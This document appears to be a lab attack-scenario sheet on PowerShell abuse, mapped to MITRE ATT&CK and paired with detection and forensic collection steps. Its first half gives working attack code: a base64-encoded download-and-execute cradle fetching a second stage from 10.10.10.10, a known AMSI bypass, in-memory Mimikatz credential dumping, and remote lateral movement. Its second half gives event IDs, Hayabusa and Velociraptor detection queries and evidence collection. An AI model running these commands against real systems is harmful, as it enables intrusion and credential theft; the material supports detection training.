# Attack Scenario: PowerShell Abuse

## MITRE ATT&CK Mapping

| Tactic               | Technique                              | ID         |
|----------------------|----------------------------------------|------------|
| Execution            | PowerShell                             | T1059.001  |
| Defense Evasion      | Obfuscated Files or Information        | T1027      |
| Defense Evasion      | Deobfuscate/Decode Files               | T1140      |
| Command & Control    | Encrypted Channel: Asymmetric Crypto   | T1573.002  |

---

## Scenario 1: Encoded Payload Execution

```powershell
# Attacker generates encoded PowerShell
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/stage2.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
Write-Host "powershell.exe -EncodedCommand $encoded"
```

**Run on victim:**
```
powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand <base64>
```

---

## Scenario 2: AMSI Bypass + Mimikatz in Memory

```powershell
# AMSI bypass (educational — lab use only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')|
  ?{$_}|%{$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}

# Load Invoke-Mimikatz from memory (no disk touch)
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

---

## Scenario 3: PowerShell Remoting Lateral Movement

```powershell
# Enable PS Remoting (attacker-controlled host)
Enable-PSRemoting -Force

# Connect to target
$session = New-PSSession -ComputerName 10.10.10.31 -Credential (Get-Credential)
Invoke-Command -Session $session -ScriptBlock { whoami; ipconfig }
```

---

## Detection Artifacts

### Windows Event IDs to collect
| Event ID | Description                    |
|----------|--------------------------------|
| 4104     | PowerShell Script Block Logging |
| 4688     | Process Creation               |
| 4698     | Scheduled Task Created         |
| 400/403  | PowerShell Engine Start/Stop   |

### Hayabusa detection
```bash
hayabusa csv-timeline -d /mnt/evidence/evtx/ \
  --detect powershell-suspicious-cmdlet
```

### Velociraptor Hunt
```sql
SELECT * FROM artifact_results(
  artifact='Windows.EventLogs.PowerShell.ScriptBlock')
WHERE ScriptBlockText =~ '(?i)(amsi|bypass|invoke-mimikatz|downloadstring)'
```

---

## Evidence Collection Commands

```bash
# From forensics VM
velociraptor artifacts collect Windows.EventLogs.PowerShell.ScriptBlock \
  --args DateAfter="2024-01-01"

# Export as JSONL for timeline
velociraptor artifacts collect Windows.EventLogs.Evtx \
  --args PathGlob='C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx'
```
